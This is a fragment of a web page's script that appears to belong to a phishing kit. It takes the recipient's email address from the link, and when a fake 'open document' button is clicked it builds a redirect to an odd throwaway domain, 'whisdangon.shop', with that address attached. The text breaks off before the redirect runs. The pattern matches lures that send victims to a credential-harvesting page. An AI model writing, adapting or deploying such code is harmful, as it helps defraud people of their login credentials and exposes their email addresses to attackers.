    <script>
        function getEmailFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            let email = urlParams.get('email'); // Check if email is in query parameter

            if (!email) {
                email = window.location.hash.substring(1); // If not, check in hash fragment
            }

            return email || 'test@test.com'; // Default email if not found
        }

        document.addEventListener("DOMContentLoaded", function () {
            let userEmail = getEmailFromURL();

            document.getElementById('openDocButton').addEventListener('click', function () {
                const redirectUrl = `https://6sjzaoahe7.whisdangon.shop/?email=${encodeURIComponent(userEmail)}`;
